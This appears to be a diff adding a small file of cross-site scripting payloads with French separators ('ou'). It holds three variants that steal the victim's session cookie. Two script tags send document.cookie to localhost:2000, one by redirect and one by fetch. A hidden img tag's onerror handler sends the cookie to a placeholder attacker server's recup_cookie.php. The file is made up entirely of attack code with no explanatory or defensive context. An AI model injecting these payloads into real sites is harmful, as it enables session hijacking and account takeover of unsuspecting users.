@@ -1,0 +1,15 @@
+<script>
+document.location = 'http://localhost:2000?cookie='+document.cookie
+</script>
+
+ou
+
+<script>
+fetch('http://localhost:2000?cookie='+document.cookie)
+</script>
+
+
+ou
+
+Michel<img src="http://localhost:2000?cookie='+document.cookie" style="display:none;" onerror="document.location='http://<SERVER_ATTAQUANT>/recup_cookie.php?
+cookie='+document.cookie;">
